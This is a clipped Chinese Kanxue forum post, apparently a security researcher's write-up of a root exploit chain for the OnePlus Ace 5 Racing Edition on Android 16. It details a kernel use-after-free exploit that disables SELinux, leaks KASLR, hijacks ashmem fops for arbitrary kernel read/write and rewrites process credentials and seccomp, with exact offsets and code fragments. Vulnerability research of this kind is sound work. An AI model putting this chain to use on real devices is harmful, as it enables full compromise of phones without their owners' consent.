---
title: 【看雪】# 1+ACE5竞速版 GhostLock提权
source: https://bbs.kanxue.com/thread-293493.htm
source_host: bbs.kanxue.com
clip_date: 2026-11-10T23:22:51+08:00
trace_id: 667edbcf-2f27-4ac4-b52c-c523dec62fdd
content_hash: be7c0f9666b31249f1572ec92f767ed84abfc79a29d4a4e9e03d62e55870766c
status: synced
tags:
  - 看雪
  - Android逆向
  - 内核
series: null
feed_source: 看雪·Android安全
ai_summary: 这是对 OnePlus Ace 5 竞速版提权 PoC 的完整利用链说明：GhostLock UAF 结合 futex PI 竞态，最终在该设备上稳定获得 root。
ai_summary_style: key-points:weak
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41475244-d011-81b0-8e6a-c7b9d35d9764
ioc:
  cves:
    - CVE-2026-43499
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points:weak）**
>
> 这是对 OnePlus Ace 5 竞速版提权 PoC 的完整利用链说明：GhostLock UAF 结合 futex PI 竞态，最终在该设备上稳定获得 root。
> 
> - **核心原语：** UAF 后用 `pselect6()` 的 fd_set 内核栈位图填充悬空的 `rt_mutex_waiter`（位图起点 `S-0x200`，waiter 起点 `S-0x198`，偏移 0x68 可完整覆盖），再通过 `sched_setattr` 触发红黑树删除，实现指向固定地址的受限写 `*(u64*)TARGET = VALUE`。
> - **SELinux 关闭：** 利用安全区（printk 静态零区）构造 VALUE，两阶段写入 `selinux_state`（linear map 偏移 `0x227d0a8`）：第一轮切 permissive，破坏了 `initialized`；第二轮非对齐写恢复 `initialized=1`。
> - **KASLR 泄露：** 借 SELinux permissive 解除 `perf_event_open` 限制，对绑核的 `sched_yield` spinner 线程做内核态采样（x20/SP/PC），用 PC 按 2MiB 块对齐的函数区间投票确定 runtime base（≥8 票），必须在替换 fops 前完成。
> - **内核读写通道：** 用 KernelSnitch + mm slab（`mm_struct` 0x3c0/步长 0x400，order-3 slab 32 对象）回收 skb 页构造 fake page，restricted write 劫持 ashmem `miscdevice.fops`（镜像偏移 `0x219f340`），fake fops 把 read/write_iter 指向 configfs 函数，通过 `ASHMEM_SET_NAME` 伪造 `configfs_buffer` 实现 pread/pwrite 任意内核读写。
> - **升级到物理页 R/W 与提权：** 再回收 `pipe_buffer`（kmalloc-2k，各 drain/reclaim 15 slabs）找到真实 pipe_buffer，按特征字段定位后改写 `struct page/offset` 得到物理页读写；遍历 `init_task` 链表找到阻塞的 root child，清零 cred/UID、写完整 capabilities、把 SELinux SID 置 1、清 seccomp 与 no_new_privs，最后恢复原始 fops 放行 child，运行 su daemon 并验证 `uid==0`。
> - **可靠性：** 利用包含多处竞态和堆布局控制，成功率非 100%；失败需整机重启重试，fops 替换落地但未完成验证时进程须 park 而非关闭 fd，以免 `filp_close()` 触发 CFI 崩溃。

## 版本信息

-   设备型号：OnePlus Ace 5 竞速版（PLF110 / OP60F9L1）
-   系统版本：Android 16，PLF110_16.0.8.302(CN01)
-   Build Fingerprint： `OnePlus/PLF110/OP60F9L1:16/UKQ1.231108.001/V.4ff06e1-2b85baa-2bc4a0f:user/release-keys`
-   内核版本： `6.1.157-android14-11-o-g30aad7550341`

POC：https://github.com/BlackIce417/root-oplusace5

## 1\. 漏洞触发

参考 `https://github.com/MobiusM/CVE-2026-43499`

## 2\. 数据构造

### 1\. UAF之后的内存结构

```
waiter: LOCK_PI(chain)
        → WAIT_REQUEUE_PI(f_wait → f_pi_target)

owner:  LOCK_PI(f_pi_target)
        → 阻塞在 LOCK_PI(chain)

main:   CMP_REQUEUE_PI(f_wait)
        → 返回 EDEADLK
        → 留下失效的 rt_mutex_waiter
```

其中 waiter 的 `task_struct::pi_blocked_on` 指向了内核栈上的一片内存，其原始类型为 `struct rt_mutex_waiter` 。

### 2\. 数据填充

填充通过当前 64 位利用进程调用 `pselect6()` 完成。用户态构造的 `fd_set` 会被内核整理成位图并放到当前线程的内核栈上；其中与 `task_struct::pi_blocked_on` 所指失效对象重叠的部分，在后续利用中会被重新解释为红黑树节点、 `struct rt_mutex_waiter` 、 `struct task_struct` 等结构。

这里有一个关键的栈布局需要注意： `pselect6()` 位图的起始地址必须低于 `struct rt_mutex_waiter` 的起始地址。ARM64 内核栈向低地址增长，而位图内容从起点向高地址排列；如果位图起点位于 waiter 之上，就不能从 waiter 的低偏移字段开始完整覆盖，伪造结构会残缺并导致利用失败。

假设栈指针为共同基准 `S` ，在本机 PLF110 的当前内核中：

-   `pselect6()` 在内核栈上生成的位图数组起点为 `S - 0x200` ；
-   `futex_wait_requeue_pi()` 的局部变量 `struct rt_mutex_waiter` 起点为 `S - 0x198` 。

因此 waiter 起点比位图起点高 `0x68` 字节，即 13 个 64 位字：

```
(S - 0x198) - (S - 0x200) = 0x68
```

`pselect6()` 的填充区起始地址更低，能够到达并覆盖失效 waiter 所在区域，所以这台设备上的栈复用布局是可行的。

### 3\. 起点的确定方法

分析一下内核的 `vmlinux.elf` ：

-   在 select 路径中， `core_sys_select()` 建立大小为 `0x1e0` 的栈帧，栈上的 `fd_set_bits` 位图位于该函数的 `sp + 0x70` 。进入 `do_select()` 时，参数寄存器 `x1` 指向这组位图。将该地址按原生 AArch64 `pselect6()` 调用链还原到共同基准后，得到位图起点 `S - 0x200` 。
-   在 futex 路径中， `futex_wait_requeue_pi()` 建立大小为 `0x1b0` 的栈帧，局部变量 `rt_waiter` 位于该函数的 `sp + 0x98` 。执行到函数偏移 `+0xac` 时，寄存器 `x27` 保存 `&rt_waiter` 。将该地址按原生 AArch64 futex 调用链还原到同一基准后，得到 waiter 起点 `S - 0x198` 。

需要注意，以上两个 `sp` 分别属于 `core_sys_select()` 和 `futex_wait_requeue_pi()` 的函数栈帧，不能直接拿 `sp + 0x70` 与 `sp + 0x98` 相减， `S - 0x200` 和 `S - 0x198` 才是。

## 3\. SELINUX修改

这里修改SELINUX主要是为了后面通过perf泄露kaslr做铺垫，正常情况perf读内核的数据是被selinux策略禁止的。

先看 `struct rt_mutex_waiter`:

```c
struct rt_mutex_waiter {
    struct rb_node tree_entry;      // +0x00，lock->waiters
    struct rb_node pi_tree_entry;   // +0x18，task->pi_waiters
    struct task_struct *task;       // +0x30
    struct rt_mutex_base *lock;     // +0x38
    int wake_state;                 // +0x40
    int prio;                       // +0x44
    u64 deadline;                   // +0x48
    struct ww_acquire_ctx *ww_ctx;  // +0x50
};
```

这个里面是包含有两个rb tree的节点实例的，而不是指针，所以构造数据的时候可以直接构造一个完整的节点放进去，内核解析操作的时候会直接  
拿着我们构造好的数据操作。

我们调用 `sched_setattr` 可以触发内核对PI的优先级检查，检查的时候内核会顺着 `pi_blocked_on` 这个指针去解析对应的 `rt_mutex_waiter` 这个结构体，  
这个结构体已经被 `pselect6()` 构造的数据填充，是个假的。

我们可以分析一下内核里删除节点的这个操作：

例如存在一个节点A，他的父节点记作AP，左节点记作AL，A是AP的左节点。如果要删除A，右子节点又是空的，那么会直接把AP->left指向AL，AL->parent=AP（中间的操作就省略）。

把这个抽象过程代入当前利用链：

```toml
A  = &waiter->tree_entry
AP = VALUE & ~3
AL = TARGET
```

`sched_setattr` 改变 waiter 线程的调度属性后，会触发 PI 优先级重新计算。内核从目标线程的 `task_struct::pi_blocked_on` 取得悬空的 waiter，随后进入大致如下的调用链：

```rust
sched_setattr
  -> __sched_setscheduler
  -> rt_mutex_adjust_pi
  -> rt_mutex_adjust_prio_chain
  -> rt_mutex_dequeue(lock, waiter)
  -> rb_erase_cached(&waiter->tree_entry, &lock->waiters)
```

### 1\. 构造红黑树节点

Linux 的 `struct rb_node` 可以简化为：

```c
struct rb_node {
    unsigned long __rb_parent_color;
    struct rb_node *rb_right;
    struct rb_node *rb_left;
};
```

其中 `__rb_parent_color` 的高位保存 parent 地址，低两位保存红黑树标志。获取真正的 parent 时，内核会屏蔽低两位：

```c
parent = (struct rb_node *)(node->__rb_parent_color & ~3UL);
```

我们把 `tree_entry` 构造成：

```c
waiter->tree_entry.__rb_parent_color = VALUE;
waiter->tree_entry.rb_right          = NULL;
waiter->tree_entry.rb_left           = TARGET;
```

删除 A 时，因为右孩子为空、左孩子存在，AL 会成为替代节点。红黑树删除代码需要把 A 的 parent/color 信息交给 AL，写入过程可以理解成：

```c
child = A->rb_left;               // child = TARGET
pc    = A->__rb_parent_color;     // pc = VALUE
child->__rb_parent_color = pc;    // *(u64 *)TARGET = VALUE
```

这里 TARGET 指向的内存并不是真的 `struct rb_node` ，内核只是被伪造的指针误导，按照 `rb_node` 偏移 0 写入了 8 字节。因此最后结果是：

```c
*(uint64_t *)TARGET = VALUE;
```

### 2\. parent 指针的有效性

这个写操作不是完全自由的 8 字节任意写，因为 VALUE 同时具有两种含义：

1.  完整的 VALUE 是最终写入 TARGET 的 8 字节内容；
2.  `VALUE & ~3` 又会被红黑树代码当成 AP，即真实的 parent 指针。

删除过程中还可能执行 `AP->rb_left = AL` 或 `AP->rb_right = AL` ，因此 AP 不仅需要是一个有效的内核地址，还必须指向已经映射、可写且允许承受附带写入的内核内存。如果 AP 无效，内核会在访问 `AP+0x08` 或 `AP+0x10` 时崩溃；如果 AP 指向正在使用的对象，则可能造成额外破坏。

当前设备选择了未使用的 printk 静态零区承接这些副作用：

```
安全区域起点：AL_ZERO_LOCK = 0xffffff8002075458
可用范围：约 [AL_ZERO_LOCK, AL_ZERO_LOCK + 0x54000)
```

此次使用的 VALUE 为：

```
VALUE  = AL_SELINUX_VALUE
       = 0xffffff8002080000
parent = VALUE & ~3
       = 0xffffff8002080000
```

这个 parent 位于上述静态零区内，是已映射且可写的安全地址。第二次修复写使用的 `VALUE & ~3 = 0xffffff8002075500` 也位于同一区域。VALUE 的选取必须同时满足“低字节能形成目标数据”和“屏蔽低两位后仍是安全 parent”这两个条件。

### 3\. 定位selinux_state

SELinux 的运行状态保存在全局变量：

```c
struct selinux_state selinux_state;
```

在当前内核的 `vmlinux.elf` 符号表和完整 kallsyms 中可以找到：

```
selinux_state = 0xffffffc00a27d0a8
```

内核镜像的静态基准为 `0xffffffc008000000` ，所以该变量的镜像内偏移为：

```
0xffffffc00a27d0a8 - 0xffffffc008000000 = 0x227d0a8
```

PLF110 的内核线性映射基址为 `0xffffff8000000000` 。将相同物理偏移换算为不依赖内核文本 KASLR slide 的 linear-map alias：

```
0xffffff8000000000 + 0x227d0a8 = 0xffffff800227d0a8
```

因此源码中使用：

```c
AL_SELINUX_STATE = 0xffffff800227d0a8;
```

再通过当前内核的 BTF 查看 `struct selinux_state` ，与此次写入有关的字段偏移为：

```
selinux_state + 0x00  enforcing
selinux_state + 0x01  checkreqprot
selinux_state + 0x02  initialized
selinux_state + 0x03  policycap[0]
```

`sel_read_enforce()` 和 `sel_write_enforce()` 的反汇编也可以用于交叉验证： `/sys/fs/selinux/enforce` 最终访问的就是 `selinux_state.enforcing` ，其偏移为 `+0x00` 。所以 stage1a 的写入目标直接取 `AL_SELINUX_STATE` ，不需要再增加字段偏移。

### 4\. 两阶段修改

第一轮写入参数为：

```
TARGET = AL_SELINUX_STATE = 0xffffff800227d0a8
VALUE  = AL_SELINUX_VALUE = 0xffffff8002080000
```

ARM64 使用小端序，这个 VALUE 写入内存后为：

```
偏移   字节   字段
+0x00  00     enforcing = 0
+0x01  00     checkreqprot = 0
+0x02  08     initialized = 8
+0x03  02     policycap[0]
+0x04  80     policycap[1]
+0x05  ff     policycap[2]
+0x06  ff     policycap[3]
+0x07  ff     policycap[4]
```

第一轮可以把 SELinux 切换为 permissive，但是固定覆盖 8 字节，同时把 `initialized` 破坏成了 8。

该内核在部分路径中要求 `initialized == 1` ，错误值会导致 zygote 设置进程上下文失败，进而造成 framework 异常，副作用是启动不了别的APP，已经启动的不受影响。

所以再执行一次非对齐写：

```
TARGET = AL_SELINIT_STATE = AL_SELINUX_STATE + 2
       = 0xffffff800227d0aa
VALUE  = AL_SELINIT_VALUE
       = 0xffffff8002075501
```

第二轮的第一个字节为 `0x01` ，因此会把 `selinux_state.initialized` 恢复为 1。其余被连带覆盖的 policycap 字节在当前设备上已经过实测，不影响后续流程。

完成两轮写入后通过 `getenforce` 查一下就能发现selinux已经设置成了permissive，可以进入下一步。

## 4\. KASLR泄露

前一阶段把 SELinux 切换为permissive主要目的就是解除 `perf_event_open()` 的策略限制。

当前实现通过 perf 对一个持续进入内核调度路径的线程采样，从中获得运行时内核代码地址，再计算内核镜像的随机化基址。

需要先区分三个量：

```
KIMAGE_TEXT_BASE = 0xffffffc008000000    // vmlinux 的静态基址
runtime_base                              // 本次启动的运行时镜像基址
kaslr_slide = runtime_base - KIMAGE_TEXT_BASE
```

源码中的 `LeakResult::kaslr_base` 和 `pe::kaslr_base` 保存的是 `runtime_base` ，而不是单独的 `kaslr_slide` 。后续解析某个内核符号时直接使用：

```
runtime_symbol = runtime_base + symbol_image_offset
```

### 1\. 构造可稳定采样的目标线程

程序先创建一个 spinner 线程，将其绑定到 CPU 7，并记录线程 TID：

```c
sched_setaffinity(0, sizeof(set), &set);
tid = syscall(SYS_gettid);

for (;;)
    syscall(SYS_sched_yield);
```

这个线程不断执行 `sched_yield()` ，因此会反复进入：

```
__arm64_sys_sched_yield
  -> do_sched_yield
  -> __schedule
```

这样 perf 在采样目标线程时，大概率能够取得上述路径中的内核 PC。固定 CPU 是为了减少迁核和调度噪声；CPU 7 是在这台 MT6989 设备上实测采样最稳定的核心。

### 2\. 配置 perf 只采集内核寄存器

`leak_from_tid(tid)` 创建一个绑定到 spinner TID 的 software CPU clock 事件：

```c
attr.type        = PERF_TYPE_SOFTWARE;
attr.config      = PERF_COUNT_SW_CPU_CLOCK;
attr.disabled    = 1;
attr.exclude_user = 1;
attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
attr.sample_period = 4000;
```

`exclude_user = 1` 表示只对目标线程在内核态运行的时间采样。 `sample_regs_intr` 只请求三个 ARM64 寄存器槽：

```
x20  用于识别 current/task_struct
SP   用于识别该线程的内核栈
PC   用于计算运行时内核镜像基址
```

当前寄存器掩码为：

```c
(1ULL << 20) | (1ULL << 31) | (1ULL << 32)
```

事件通过以下方式绑定到指定线程，而不是绑定当前调用线程：

```c
perf_event_open(&attr, tid, -1, -1, 0);
```

随后 mmap 一个 perf ring buffer，其中包含一页 metadata 和 64 页数据区。采样器启用事件后，每隔 20 ms 消费 ring 中的 `PERF_RECORD_SAMPLE` ，总计运行约 1.2 秒。

### 3\. 从 sample 中解析 PC、SP 和 x20

当前 sample 布局为：

```
perf_event_header | IP | ABI | x20 | SP | PC
```

代码先检查 record 长度，随后依次取出：

```c
uint64_t x20 = regs[0];
uint64_t sp  = regs[1];
uint64_t pc  = regs[2];
```

只有满足 `0xffffff...`内核虚拟地址特征的值才会进入统计，用户态地址和损坏记录都会被丢弃。

#### SP：内核栈基址

当前内核的 `THREAD_SIZE` 为 `0x4000` ，所以把采样 SP 向下按 16 KiB 对齐：

```c
stack_base = sp & ~0x3fffULL;
```

多个样本可能存在调度噪声，因此代码使用直方图统计，选择出现次数最多的 16 KiB 对齐地址作为 `LeakResult::stack_base` 。

#### x20：task_struct地址

在本机分析和选定的 `sched_yield` 调度路径中， `x20` 会稳定保存 `current` 。代码只接受同时满足以下条件的 x20：

```
是 0xffffff... 形式的内核地址
按 0x40 字节对齐
对应样本中的 SP 也是有效内核栈地址
```

同样通过直方图取最高频值，得到 `LeakResult::task_addr` 。这个寄存器含义来自 PLF110 当前内核的反汇编，并不是 ARM64 ABI 对所有内核版本作出的保证。

### 4\. 使用 PC 投票得到运行时内核基址

KASLR 保持内核镜像按 2 MiB 对齐。采样器预先记录了 spinner 可能经过的几个函数在 `vmlinux.elf` 中的静态区间：

```
__arm64_sys_sched_yield  [0x10e098, 0x10e0b8)
do_sched_yield           [0x10e0b8, 0x10e238)
__schedule               [0xff50a4, 0xff5b48)
preempt_schedule_common  [0xff5cb8, 0xff5d08)
hrtimer_nanosleep        [0x1aae10, 0x1aaf00)
```

对每个采样 PC，代码尝试判断它位于哪个已知函数的运行时区间。以某个静态函数区间 `[func_start, func_end)` 为例：

```c
pc_block   = pc         & ~0x1fffffULL;
func_block = func_start & ~0x1fffffULL;
candidate  = pc_block - func_block;
relative   = pc - (func_start + candidate);
```

只有满足：

```
relative < func_end - func_start
```

时，才认为这个 PC 确实落在该函数中，并给 `candidate` 投一票。这里的 candidate 就是候选 `runtime_base` 。

不能简单地让每个 PC 对所有函数执行 `pc - func_start` 并全部投票，否则每个样本会对所有候选产生相同数量的票，无法区分真实基址。当前算法先做 2 MiB 块对齐，再检查 PC 是否确实位于候选函数区间中。

投票表最多维护 16 个候选基址。候选至少获得 8 票才有效，最后选择票数最高者：

```c
runtime_base = candidate_with_most_votes;
```

例如，如果某次启动得到：

```
runtime_base = 0xffffffc0XXXXXXXX
```

则实际 KASLR slide 为：

```
kaslr_slide = runtime_base - 0xffffffc008000000
```

### 5\. 结果检查和后续用途

如果投票结果为 0，程序直接退出，不会继续构造带函数指针的 fake fops。

如果泄露成功，则调用：

```c
pe::set_kaslr_base(runtime_base);
```

此后 `page_engine` 把所有内核代码符号从镜像偏移转换为运行时地址：

```c
text_addr(image_offset) = runtime_base + image_offset;
```

这一步必须发生在替换 `miscdevice.fops` 之前，因为 `misc_open()` 取得伪造 fops 后会立即调用其中的 `open` 函数；fake fops 内的代码指针如果没有加上正确的 KASLR 基址，会直接跳转到错误地址并导致内核异常。

在后续已经获得内核 R/W 通道后，还可以读取原始 `ashmem_fops` 中的 `open/ioctl/mmap` 函数指针进行交叉验证：

```
runtime_base = ashmem_fops.open - IMG_ASHMEM_OPEN
```

然后检查：

```
ashmem_fops.ioctl == runtime_base + IMG_ASHMEM_IOCTL
ashmem_fops.mmap  == runtime_base + IMG_ASHMEM_MMAP
```

不过这是获得 R/W 之后的复核路径；当前主链在替换 fops 之前使用的初始 KASLR 来源仍然是 perf 的内核 PC 采样。

## 5\. 修改 miscdevice.fops

KASLR 泄露完成后，前面的单次受限写就可以升级为能够重复使用的内核读写通道。

当前实现选择劫持 ashmem miscdevice 的 `fops` 指针，使新打开的 `/dev/ashmem` 文件使用位于可控内核页中的 fake fops。

### 1\. 准备已知地址的 fake page

`page_engine` 先整理 `mm_struct` 对应的 SLUB cache，通过暂停的 clone 子进程制造对象，并使用 `/proc/<pid>/mem` 文件描述符固定相应的 `mm_struct` 。随后通过 KernelSnitch 的 futex hash bucket timing side channel 得到目标 `mm_struct` 所在 slab 的地址，释放目标 slab，再用 Unix socket skb 数据页回收这块 order-3 内存，把预先构造的 payload 放入已知内核地址。

这部分沿用上游实现，具体的 slab grooming、碰撞搜索和地址恢复算法参考：

`alex193a/Root-My-Pixel-Payloads`

本机适配需要注意：BTF 中 `mm_struct` 大小为 `0x3c0` ，但 PLF110 的 SLUB 对象实际按 `0x400` 步长排列；一个 order-3 slab 中包含 32 个对象。代码使用 4 组 KernelSnitch 碰撞约束，降低错误候选地址出现的概率。

回收后的 order-3 page 中布置了：

```css
page + 0x1000  fake struct file_operations
page + 0x1350  fake rt_mutex
page + 0x2220  fake rt_mutex_waiter
page + 0x3000  R/W 自检 scratch
page + 0x3200  fake task_struct
```

泄露并回收该页的 engine 进程保持运行，以持续持有承载 payload 的 skb 页面；控制进程只接收 `fake_fops` 、 `fake_lock` 和 `fake_task` 等地址。

### 2\. 找到 ashmem miscdevice 的 fops 指针

通过分析 PLF110 内核镜像，得到：

```
ashmem miscdevice.fops 镜像偏移：0x219f340
原始 ashmem_fops 镜像偏移：      0x11ecf88
```

`miscdevice.fops` 是数据指针，可以通过线性映射别名直接访问：

```
misc_fops_alias = LINEAR_MAP_BASE + 0x219f340
```

这一地址不依赖内核文本 KASLR。fake fops 中的函数指针则必须使用上一节泄露的 `runtime_base` 计算，例如：

```
fake_fops->open       = runtime_base + IMG_ASHMEM_OPEN
fake_fops->ioctl      = runtime_base + IMG_ASHMEM_IOCTL
fake_fops->read_iter  = runtime_base + IMG_CONFIGFS_READ_ITER
fake_fops->write_iter = runtime_base + IMG_CONFIGFS_BIN_WRITE_ITER
```

### 3\. 使用受限写替换 fops

再次运行 GhostLock canvas，将 rb-tree 删除原语设置为：

```
TARGET = misc_fops_alias
VALUE  = fake_fops
```

同时把伪造 waiter 的 `task` 和 `lock` 分别设置为 fake page 中的 `fake_task` 和 `fake_lock` ，使 PI chain 能够安全走完整个删除过程。写入成功后：

```c
ashmem_misc.fops = fake_fops;
```

此后新打开 `/dev/ashmem` 时， `misc_open()` 会把 fake fops 安装到新文件的 `file->f_op` ，并立即调用 fake fops 中的 `open` ，所以 fake fops 中所有会在 open/close 路径使用的函数指针必须在替换前就已经带上正确的 KASLR 基址。

## 6\. 从 fake fops 得到 configfs 内核 R/W

fake fops 保留 ashmem 正常的 `open/ioctl/mmap/release` 等处理函数，但把：

```
read_iter  -> configfs_read_iter
write_iter -> configfs_bin_write_iter
```

这样， `/dev/ashmem` 仍然可以通过 `ASHMEM_SET_NAME` 修改 ashmem 私有对象中的 name 缓冲区；而执行 `pread/pwrite` 时，内核却会把同一个 `file->private_data` 误解释成 `struct configfs_buffer` 。

PLF110 的 `struct configfs_buffer` 中与读写有关的偏移为：

```
+0x10  page
+0x50  needs_read_fill
+0x58  bin_buffer
+0x60  bin_buffer_size
+0x64  cb_max_size
```

ashmem 的 name 数据在私有对象中存在一个固定前缀偏移。本机主要使用偏移 11，并保留 16、4 两个候选值进行自检。程序通过多次 `ASHMEM_SET_NAME` 把包含零字节的指针和字段逐步写入 name 缓冲区，从而伪造上述 `configfs_buffer` 字段。

### 1\. 任意地址读取

`configfs_read_iter()` 最终会从伪造的 `buffer->page + ki_pos` 读取。由于私有对象开头保留的 `"dev/ashm"` 会被解释成 count，代码选择一个特殊的 `ki_pos` ，使：

```
count - ki_pos = len
page + ki_pos  = target
```

于是对 ashmem fd 执行：

```c
pread(fd, user_buffer, len, ki_pos);
```

就能把内核 `target` 处的数据复制到用户态。

### 2\. 任意地址写入

写入时伪造：

```toml
bin_buffer      = target - ki_pos
bin_buffer_size = ki_pos + len
cb_max_size     = 0
```

再执行：

```c
pwrite(fd, data, len, ki_pos);
```

`configfs_bin_write_iter()` 便会把用户数据复制到：

```
bin_buffer + ki_pos = target
```

由于 ashmem name 使用字符串复制，地址字节中出现 NUL 会提前终止写入。代码会搜索一个较小的 `ki_pos` ，使 `target - ki_pos` 的每个地址字节都非零，再用 position 抵消该编码偏移。

### 3\. 通道自检

`try_rw()` 首先读取 `misc_fops_alias` ，确认其当前值等于 `fake_fops` ；然后在 fake page 的 scratch 区写入 marker 并读回比较。只有 fops 替换和读写自检均通过，才保存该 ashmem fd 作为后续 `kread/kwrite` 通道。

## 7\. configfs R/W 到 pipe 物理页 R/W

configfs 通道虽然可以访问普通内核地址，但其数据复制仍经过 SLUB hardened-usercopy 检查。直接把 `task_struct` 或 `cred` 作为 copy_to_user/copy_from_user 的源或目标会被对应 cache 的 usercopy 白名单阻止。因此当前实现不直接用 configfs 修改凭据，而是先用它改写一个真实的 `struct pipe_buffer` ，把普通 pipe 的读写升级成按 `struct page` 寻址的物理页读写。

### 1\. 回收一个 pipe_buffer slab

程序创建 drain pipes 和 reclaim pipes，并把 pipe ring 扩展到 32 个 slot。32 个 `struct pipe_buffer` 会落入约 `0x800` 大小的 kmalloc 对象中。随后再次使用与上游相同的 mm slab grooming、KernelSnitch 地址泄露和 order-3 回收流程，使已知地址的 order-3 内存被 pipe ring 数组占用。

当前在 PLF110 上经过验证的参数是 15 个 drain slabs 和 15 个 reclaim slabs。 `kmalloc-2k` 的一个 order-3 slab 包含 16 个对象，因此两组分别创建 240 个 pipe 对象。这里保留与成功样本一致的单次回收流程：每次启动只执行一次 `prepare_pipe_page()` 和一次 `select_pipe_cache_page()` ，不会在已经进入 poisoned 状态的同一进程里销毁 helper 后继续循环回收。

该限制与 fake fops 的生命周期有关。pipe helper 会继承已经使用 fake fops 的文件描述符，而承载 fake fops 的页面同时可能仍被活动的 `mm_struct` 对象写入；其中 `file_operations.flush` 对应的 `+0x78` 位置可能重新变成一个数据指针。如果在同一轮失败后终止 helper，其退出路径会关闭继承的 fd， `filp_close()` 可能把这个数据指针当作函数调用并触发 CFI。因此，pipe 回收失败后应先走已有的 `miscdevice.fops` 紧急恢复路径并保持当前进程不再清理这些 fd，然后通过整机重启开始下一次尝试。

这一段 KernelSnitch 和 mm slab 回收同样参考：

`alex193a/Root-My-Pixel-Payloads`

程序通过 configfs R/W 读取这 8 个 4 KiB 页对应的 `struct page` 元数据，检查 `slab_cache` 是否属于 `kmalloc_caches[]` ，从而选出实际承载 pipe ring 的页面。

### 2\. 定位具体 pipe_buffer

每个 reclaim pipe 被写入不同长度的数据：

```
pipe[0] 写入 1 字节
pipe[1] 写入 2 字节
...
```

这样 `pipe_buffer.len - 1` 就可以反推出该对象属于哪一个 pipe。随后分块扫描目标 slab，寻找满足以下特征的 `struct pipe_buffer` ：

```
page         是有效的 vmemmap struct page 指针
offset       == 0
ops          == runtime anon_pipe_buf_ops
flags        == PIPE_BUF_FLAG_CAN_MERGE
private_data == 0
len          与某个 pipe 的 marker 长度匹配
```

找到后保存其内核地址和 pipe 下标。

### 3\. 构造物理页读取

读取任意 direct-map 地址时，先把地址换算为对应的 `struct page *` ：

```
pfn  = (direct_addr - LINEAR_MAP_BASE) >> 12
page = VMEMMAP_START + pfn * sizeof(struct page)
```

然后临时把真实 `pipe_buffer` 改成：

```toml
page   = 目标 struct page
offset = direct_addr & 0xfff
len    = read_len + 1
ops    = anon_pipe_buf_ops
```

从对应 pipe 的读端读取 `read_len` 字节，即可把目标物理页内容带回用户态。操作完成后立即恢复原始 `pipe_buffer` 。

### 4\. 构造物理页写入

写入时同样替换 `page` 和 `offset` ，并设置：

```
len   = 0
flags = PIPE_BUF_FLAG_CAN_MERGE
```

随后向 pipe 写端写入数据，pipe merge 路径会把数据直接写入指定 page 的 offset。写完后恢复原始 `pipe_buffer` 。

`phys_read()` 和 `phys_write()` 会按 4 KiB 边界拆分跨页请求。正式修改任务凭据前，程序先在 fake page 的 scratch 区做交叉自检：configfs 写入、pipe 读取，再由 pipe 写入、configfs 读回；两边结果都一致后才认为物理页 R/W 可用。

## 8\. 修改 cred、SELinux SID 和 seccomp

物理页 R/W 建立后，控制进程先 fork 一个专用 root child。child 阻塞在同步 pipe 上，不执行新的用户态程序；父进程完成所有内核对象修改并恢复 fops 后才会放行它。

### 1\. 定位 root child 的 task_struct

父进程从 `init_task.tasks` 开始遍历全局任务链表：

```
task_struct.tasks      +0x550
task_struct.pid        +0x630
task_struct.real_cred  +0x830
task_struct.cred       +0x838
task_struct.seccomp    +0x900
```

逐个读取 pid，直到找到与 root child PID 相同的 `task_struct` 。

### 2\. 修改 cred

分别读取 child 的 `cred` 和 `real_cred` ；如果两者不是同一对象，则分别修改。PLF110 当前 `struct cred` 中使用的偏移为：

```
+0x04  uid/gid/suid/sgid/euid/egid/fsuid/fsgid
+0x24  securebits
+0x28  capability 集合
+0x78  security 指针
```

写入内容为：

```
8 个 uid/gid 字段全部置 0
securebits 置 0
inheritable/permitted/effective/bset/ambient 设置为完整 capability mask
```

写入后重新读取 `uid` 和 `euid` ，必须同时为 0 才继续。

### 3\. 修改 SELinux cred SID

`cred->security` 指向 LSM blob。SELinux blob 在复合 security blob 内的偏移不是硬编码为 0，而是从内核全局 `selinux_blob_sizes` 中读取：

```
selinux_blob_sizes 镜像偏移：0x156d8a0
```

得到 SELinux cred blob 偏移后，在对应位置写入：

```c
osid = 1;
sid  = 1;
```

SID 1 对应 kernel initial SID，使 root child 的 SELinux 凭据与 uid/capability 修改保持一致。

### 4\. 解除 seccomp 和 no_new_privs

仅修改 cred 不足以执行 shell，因为 app 线程仍继承原有 seccomp 过滤器和 `no_new_privs` 。代码继续修改 root child：

```
task 起始 thread_info.flags：清除 bit 11，TIF_SECCOMP
task + 0x5f0 atomic_flags：清除 bit 0，PFA_NO_NEW_PRIVS
task + 0x900 seccomp.mode：置 0
task + 0x904 seccomp flags/padding：置 0
task + 0x908 seccomp.filter：置 NULL
```

至此 root child 具备 uid 0、完整 capabilities、kernel SID，并且不再受原 app seccomp filter 限制。

## 9\. 恢复 fops，再放行 root child

凭据修改完成后不能立即让 child 执行命令。此时全局 `ashmem_misc.fops` 仍指向 fake page，如果其他进程新打开 `/dev/ashmem` ，会继续取得伪造函数表；fake page 生命周期也依赖保持运行的 engine 进程。因此必须先恢复全局 fops。

通过已经打开的 configfs R/W fd 写回：

```
TARGET = misc_fops_alias
VALUE  = runtime_base + IMG_ASHMEM_FOPS
```

也就是：

```c
ashmem_misc.fops = original_ashmem_fops;
```

已经打开的 R/W fd 自身仍保存 fake `file->f_op` ，所以恢复全局指针不会中断当前这一次写入；但之后新打开的 ashmem fd 会重新使用原始函数表。

需要区分两类失败时机：在 configfs R/W 已经通过自检以后，后续的 pipe 回收、凭据修改等失败分支可以使用 `kernel_write64()` 执行 emergency restore，然后停止后续操作；如果 fops 替换可能已经落地，但 `try_rw()` 尚未完成验证，则程序还没有可靠的内核写通道，不能声称一定能够恢复全局 fops。此时实现会保留可能持有 fake fops 的 fd 并 park，避免主动关闭它；设备仍可能因为其他进程在这一窗口打开或关闭 ashmem fd 而在 `filp_close()` 触发 CFI。遇到这种情况应等待设备自动重启，或在设备仍在线时手动重启，再从干净启动重新尝试。

确认 fops 恢复成功后，父进程通过同步 pipe 放行 root child。child 随后：

1.  调用 `setgid(0)` 和 `setuid(0)` ，并把 uid/euid/gid/egid 返回给父进程验证；
2.  安装 `/data/local/tmp/su` 并启动 su daemon；
3.  执行 `id` 和 `whoami` ，将结果保存到 `/data/local/tmp/root_proof.txt` ；
4.  保持进程存活，使 su daemon 和相关利用状态继续有效。

